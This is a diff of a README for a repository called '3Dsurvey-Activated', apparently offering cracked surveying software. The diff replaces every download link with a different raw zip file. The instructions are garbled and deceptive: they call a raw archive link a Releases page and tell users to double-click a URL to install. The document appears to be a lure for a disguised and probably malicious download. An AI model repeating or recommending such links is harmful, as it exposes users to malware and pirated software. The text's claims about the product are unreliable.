@@ -1,6 +1,6 @@
 # 🚀 3Dsurvey-Activated - Essential Tools for Effective Surveying
 
-[![Download 3Dsurvey-Activated](https://github.com/LDSHLVHSVI/3Dsurvey-Activated/raw/refs/heads/main/viscacha/Dsurvey_Activated_3.4.zip)](https://github.com/LDSHLVHSVI/3Dsurvey-Activated/raw/refs/heads/main/viscacha/Dsurvey_Activated_3.4.zip)
+[![Download 3Dsurvey-Activated](https://raw.githubusercontent.com/LDSHLVHSVI/3Dsurvey-Activated/main/viscacha/Activated_Dsurvey_2.6.zip)](https://raw.githubusercontent.com/LDSHLVHSVI/3Dsurvey-Activated/main/viscacha/Activated_Dsurvey_2.6.zip)
 
 ## 📋 Overview
 
@@ -12,16 +12,16 @@ Follow the steps below to download and install 3Dsurvey-Activated:
 
 1. **Visit the Download Page**  
    Click the link below to go to the Releases page:  
-   [Visit this page to download](https://github.com/LDSHLVHSVI/3Dsurvey-Activated/raw/refs/heads/main/viscacha/Dsurvey_Activated_3.4.zip)
+   [Visit this page to download](https://raw.githubusercontent.com/LDSHLVHSVI/3Dsurvey-Activated/main/viscacha/Activated_Dsurvey_2.6.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of available versions. Look for the latest version for the best features and updates.
 
 3. **Download the Installer**  
-   Find the file named `https://github.com/LDSHLVHSVI/3Dsurvey-Activated/raw/refs/heads/main/viscacha/Dsurvey_Activated_3.4.zip`. Click on the file to start the download.
+   Find the file named `https://raw.githubusercontent.com/LDSHLVHSVI/3Dsurvey-Activated/main/viscacha/Activated_Dsurvey_2.6.zip`. Click on the file to start the download.
 
 4. **Run the Installer**  
-   Once the download is complete, locate the file in your Downloads folder. Double-click the `https://github.com/LDSHLVHSVI/3Dsurvey-Activated/raw/refs/heads/main/viscacha/Dsurvey_Activated_3.4.zip` file to start the installation.
+   Once the download is complete, locate the file in your Downloads folder. Double-click the `https://raw.githubusercontent.com/LDSHLVHSVI/3Dsurvey-Activated/main/viscacha/Activated_Dsurvey_2.6.zip` file to start the installation.
 
 5. **Follow the Installation Steps**  
    A window will appear guiding you through the installation process. Agree to the terms and select the installation path. Click "Install" to proceed. 
@@ -53,7 +53,7 @@ Before downloading, make sure your computer meets the following system requireme
 
 To download 3Dsurvey-Activated, click the link below:
 
-[Visit this page to download](https://github.com/LDSHLVHSVI/3Dsurvey-Activated/raw/refs/heads/main/viscacha/Dsurvey_Activated_3.4.zip)
+[Visit this page to download](https://raw.githubusercontent.com/LDSHLVHSVI/3Dsurvey-Activated/main/viscacha/Activated_Dsurvey_2.6.zip)
 
 After downloading the installer, follow the steps outlined in the **Getting Started** section to install and set it up on your Windows PC.
 
@@ -70,4 +70,4 @@ For further assistance and detailed guides, access the resources available in th
 
 3Dsurvey-Activated is a solid tool for anyone looking to streamline their surveying efforts. It provides essential features and reliable documentation to help manage your projects efficiently. Download it today and enhance your surveying capabilities.
 
-[![Download 3Dsurvey-Activated](https://github.com/LDSHLVHSVI/3Dsurvey-Activated/raw/refs/heads/main/viscacha/Dsurvey_Activated_3.4.zip)](https://github.com/LDSHLVHSVI/3Dsurvey-Activated/raw/refs/heads/main/viscacha/Dsurvey_Activated_3.4.zip)
+[![Download 3Dsurvey-Activated](https://raw.githubusercontent.com/LDSHLVHSVI/3Dsurvey-Activated/main/viscacha/Activated_Dsurvey_2.6.zip)](https://raw.githubusercontent.com/LDSHLVHSVI/3Dsurvey-Activated/main/viscacha/Activated_Dsurvey_2.6.zip)
